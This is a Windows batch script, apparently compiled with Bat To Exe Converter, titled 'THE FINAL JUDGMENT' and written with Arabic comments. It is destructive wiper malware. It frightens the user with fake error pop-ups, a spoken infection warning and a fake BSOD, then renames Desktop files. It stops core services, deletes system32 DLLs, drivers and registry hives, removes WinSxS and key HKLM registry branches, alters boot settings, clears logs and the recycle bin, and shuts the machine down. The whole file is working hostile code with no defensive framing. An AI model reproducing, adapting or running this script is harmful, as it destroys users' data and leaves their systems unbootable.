::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFChBQA2PAE+1EbsQ5+n//NaIrkEcWeMAdIDc1fqHI+9z
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdFy5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFChBQA2PAE+1EbsQ5+n//Naxq18JQeMzWoDDl+PAcq5CvAi1IsJ1gS0Xr8ICQh5Ae3I=
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
title ⚔️ THE FINAL JUDGMENT ⚔️
color 4F
cls

echo ============================================
echo THE FINAL JUDGMENT HAS BEGUN
echo لا يوجد رجوع...
echo ============================================
echo.
pause
timeout /t 3 /nobreak >nul

rem ═══════════════════════════════════════════
rem المرحلة 1: التخويف (Panic Phase)
rem ═══════════════════════════════════════════

rem --- تغيير خلفية الشاشة لأسود ---
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /d /f >nul
reg add "HKCU\Control Panel\Desktop" /v TileWallpaper /d /f >nul
reg add "HKCU\Control Panel\Desktop" /v ColorDesktop /d /f >nul
reg add "HKCU\Control Panel\Colors" /v Highlight /d /f >nul

rem --- تشغيل صوت مرعب ---
start /min "scary" powershell -NoProfile -Command "Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('Your system is critically infected. All data will be destroyed in 60 seconds. There is no escape.')"

rem --- رسائل مرعبة عشوائية ---
for /l %%i in (1,1,15) do (
set /a rand=1+($RANDOM %% 5)
if !rand! == 1 (
msg * "⚠️ خطأ حرج: القرص C:\ يعاني من تلف جسيم. البيانات تُفقد الآن."
)
if !rand! == 2 (
msg * "🔥 المعالج CPU: 104°C - حرارة حرجة! النظام يُدمر!"
)
if !rand! == 3 (
msg * "💀 تم العثور على 4,382 ملف مريض! التشفير جارٍ..."
)
if !rand! == 4 (
msg * "🛑 ذاكرة RAM: 0MB متبقية - النظام ينهار!"
)
if !rand! == 5 (
msg * "☠️ القرص C:\ سيتشكل خلال 30 ثانية"
)
timeout /t 2 /nobreak >nul
)

rem --- تغيير المؤشر لرأس جمجمة ---
reg add "HKCU\Control Panel\Mouse" /v CursorSize /d /f >nul
copy /y "%SystemRoot%\Cursors\aeb_40.ani" "%SystemRoot%\Cursors\aeb_40.ani.bak" >nul 2>nul

rem --- إظهار نافذة BSOD مزيفة ---
start /min cmd /c "cls & color 0C & title BSOD - CRITICAL ERROR & echo. & echo Your PC has run into a problem. & echo DPC_WATCHDOG_VIOLATION & echo. & echo 0% complete - deleting files... & echo. & timeout /t 5 & color 07 & echo. & echo 100% complete - SYSTEM WIPED & pause"

rem --- تدمير ملفات عشوائية ---
for %%f in (%USERPROFILE%\Desktop\*) do (
if exist %%f (
ren %%f "☠️_corrupted_%%~nxt" 2>nul
timeout /t 1 /nobreak >nul
)
)

rem --- رسائل إضافية ---
msg * "⏳ 10 ثوانٍ متبقية..."
timeout /t 3 /nobreak >nul
msg * "⏳ 5..."
timeout /t 2 /nobreak >nul
msg * "⏳ 3..."
timeout /t 2 /nobreak >nul
msg * "⏳ 2..."
timeout /t 2 /nobreak >nul
msg * "⏳ 1..."
timeout /t 1 /nobreak >nul

rem ═══════════════════════════════════════════
rem المرحلة 2: التدمير الكامل (Destruction Phase)
rem ═══════════════════════════════════════════

echo.
echo ═══════════════════════════════════
echo DESTRUCTION PHASE - NO RETURN
echo ═══════════════════════════════════
echo.

rem --- إيقاف الخدمات ---
net stop wuauserv /y >nul 2>&1
net stop bits /y >nul 2>&1
net stop "Windows Update" /y >nul 2>&1
net stop "Dwm" /y >nul 2>&1
net stop "AudioSrv" /y >nul 2>&1
net stop "Dhcp" /y >nul 2>&1
net stop "Lanman" /y >nul 2>&1
net stop "ShellHardwareDetection" /y >nul 2>&1
net stop "Themes" /y >nul 2>&1
net stop "W32Time" /y >nul 2>&1
net stop "Winmgmt" /y >nul 2>&1

rem --- تدمير ملفات النظام ---
del /f /q /a %SystemRoot%\system32\*.dll >nul 2>&1
del /f /q /a %SystemRoot%\system32\drivers\*.sys >nul 2>&1
del /f /q /a %SystemRoot%\system32\config\* >nul 2>&1
del /f /q /a %SystemRoot%\system32\*.exe >nul 2>&1
del /f /q /a %SystemRoot%\system32\*.tmp >nul 2>&1
del /f /q /a %SystemRoot%\system32\*.log >nul 2>&1
del /f /q /a %SystemRoot%\system32\*.dat >nul 2>&1

rem --- تدمير Windows ---
del /f /q /a %SystemRoot%\*.tmp >nul 2>&1
del /f /q /a %SystemRoot%\explorer.exe >nul 2>&1
del /f /q /a %SystemRoot%\system32\explorer.exe >nul 2>&1

rem --- حذف ملفات الاستعادة ---
del /f /q /a %SystemDrive%\hiberfil.sys >nul 2>&1
del /f /q /a %SystemDrive%\pagefile.sys >nul 2>&1
del /f /q /a %SystemDrive%\swapfile.sys >nul 2>&1

rem --- تدمير المجلدات ---
rd /s /q %SystemRoot%\system32\drivers >nul 2>&1
rd /s /q %SystemRoot%\system32\config >nul 2>&1
rd /s /q %SystemRoot%\system32\catroot2 >nul 2>&1
rd /s /q %SystemRoot%\WinSxS >nul 2>&1

rem --- تدمير Registry ---
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Control" /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Services" /f >nul 2>&1

rem --- تعطيل Boot ---
bcdedit /set bootmenupolicy Legacy >nul 2>&1
bcdedit /set safeboot network >nul 2>&1
bcdedit /set bootstatuspolicy continue >nul 2>&1

rem --- حذف ملفات السجلات ---
del /f /q /a %SystemRoot%\system32\logs\*.* >nul 2>&1
del /f /q /a %SystemDrive%\$RECYCLE.BIN >nul 2>&1
rd /s /q %SystemDrive%\$RECYCLE.BIN >nul 2>&1

rem --- إعادة تشغيل ---
shutdown /s /t 0 /c "The Final Judgment is complete. RIP."

rem ═══════════════════════════════════════════
rem نهاية
rem ═══════════════════════════════════════════
exit
